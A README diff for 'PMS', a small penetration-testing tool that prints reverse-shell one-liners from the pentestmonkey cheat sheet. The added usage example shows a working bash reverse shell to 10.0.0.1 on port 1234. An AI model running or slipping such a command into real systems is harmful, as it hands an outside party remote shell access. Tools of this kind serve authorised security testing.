@@ -4,6 +4,23 @@ PMS - Print My Shell
 PMS will help you get you revers shell filled with you IP and port number.\
 It's contains [pentestmonkey revers shell cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) shells.
 
+Install
+----------------
+```sh
+$ git clone https://github.com/etrock/PMS.git
+$ cd PMS
+```
+You can add to your ~/.bashrc file
+```
+alias pms='python3 "<pms path>/pms.py"'
+source ~/.bashrc
+```
+and now you can use like :
+```sh
+$ psm bash
+bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
+```
+
 Configuration
 ----------------
 In ```pms.conf``` file you can set your  ```ethernet_interface``` name, ```ip``` address or ```port``` number\
